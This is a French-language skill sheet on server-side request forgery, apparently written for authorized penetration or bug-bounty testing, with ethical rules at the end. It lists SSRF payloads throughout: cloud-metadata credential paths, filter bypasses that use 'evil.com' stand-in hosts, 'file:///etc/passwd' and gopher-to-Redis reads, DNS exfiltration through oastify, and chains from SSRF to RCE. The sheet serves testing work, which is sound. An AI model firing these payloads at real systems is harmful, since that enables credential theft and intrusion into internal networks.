# Skill — SSRF (Server-Side Request Forgery)

Forcer le serveur à émettre une requête vers une cible contrôlée (interne ou externe).

## 1. Identifier les candidats

Endpoints typiques :
- `?url=`, `?dest=`, `?next=`, `?redirect=`, `?uri=`, `?callback=`, `?webhook=`
- Upload par URL (avatar, import)
- Preview/screenshot services
- PDF/report generators (wkhtmltopdf, puppeteer, headless chrome)
- OAuth/OIDC redirect endpoints
- XML parsers (XXE + SSRF)

## 2. Test initial

Remplace le paramètre par un callback Burp Collaborator ou `webhook.site` :

```
?url=https://<your-collaborator>.oastify.com/
```

Si le hit arrive → SSRF confirmée. Note :
- IP source (cloud provider ? VPC interne ?)
- User-Agent (révèle le parser : `curl`, `python-requests`, `Go-http-client`)
- Headers additionnels leak-ables

## 3. Cibles internes classiques

### Cloud metadata (toujours tester en priorité)

| Cloud | Endpoint | Pre-req |
|-------|----------|---------|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | Non-IMDSv2 |
| AWS IMDSv2 | Header `X-aws-ec2-metadata-token: <token>` | Token via PUT |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` + header `Metadata-Flavor: Google` | |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + `Metadata: true` | |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | |

### Réseau interne

- `http://localhost:<port>/` — scan 22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200 (ES), 15672 (RabbitMQ), 27017 (Mongo), 2375 (Docker)
- `http://127.0.0.1/`, `http://[::1]/`
- `http://10.0.0.0/8`, `http://172.16.0.0/12`, `http://192.168.0.0/16`

## 4. Bypass de filtres

| Filtre | Bypass |
|--------|--------|
| Blacklist `127.0.0.1` | `http://localhost/`, `http://0.0.0.0/`, `http://[::1]/` |
| Blacklist `localhost` | IP décimale : `http://2130706433/` (= 127.0.0.1), octal `http://0177.0.0.1/` |
| Regex `^https?://`| `file:///etc/passwd`, `gopher://`, `dict://` |
| DNS résolu côté app | DNS rebinding (`rebinder.nip.io`, `tiredpaper.com`), ou TOCTOU |
| URL parser mismatch | `http://evil.com#@127.0.0.1/`, `http://evil.com@127.0.0.1/`, `http://127.0.0.1%2523@evil.com/` |
| Only same-origin | Redirect : `http://evil.com/redirect` renvoie 302 vers `http://127.0.0.1/` |
| Port blocklist | Port non-standard : `:1234`, `:65535` |

## 5. Protocoles exotiques

Si le parser est libcurl / PHP :
- `file:///etc/passwd` — lecture fichier local
- `gopher://127.0.0.1:6379/_<commande Redis>` — RCE via Redis, SMTP, FastCGI
- `dict://127.0.0.1:11211/stats` — Memcached
- `ldap://`, `ftp://`, `sftp://`

## 6. Blind SSRF — comment prouver l'impact

- Timing-based : `http://10.0.0.1:22/` vs `http://10.0.0.99/` — diff de temps = port ouvert/fermé
- DNS exfil : `http://<data>.oastify.com/` (limite : 63 chars par label)
- Error-based : `http://internal-host/invalid-path` renvoie-t-il une erreur spécifique ?

## 7. Chain SSRF → RCE

1. SSRF vers IMDS → steal IAM credentials → AWS access
2. SSRF vers Redis → `CONFIG SET dir`, `CONFIG SET dbfilename`, `SET …`, `SAVE` → écriture fichier → RCE (ne faire que si explicitement autorisé)
3. SSRF vers interne Jenkins/Kubernetes API → RCE via jobs/pods

## 8. Impact

- **Low** : Blind SSRF, pas d'accès interne démontré
- **Medium** : Scan de ports internes, leak de bannière
- **High** : Accès aux metadata cloud (même sans creds)
- **Critical** : Lecture credentials IAM/service account, ou pivot vers interne → prise de contrôle

## 9. PoC — format

```http
POST /api/fetch HTTP/1.1
Host: target.com
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

Response (preuve de compromission — **redact les tokens réels**) :
```
["<role-name-redacted>"]
```

## 10. Règles éthiques

- **Jamais** d'utilisation réelle des credentials IAM récupérés.
- **Jamais** de commande `SAVE` / `CONFIG SET` sur Redis/Memcached de prod.
- Stoppe dès que l'impact est prouvé, ne pivote pas plus loin.
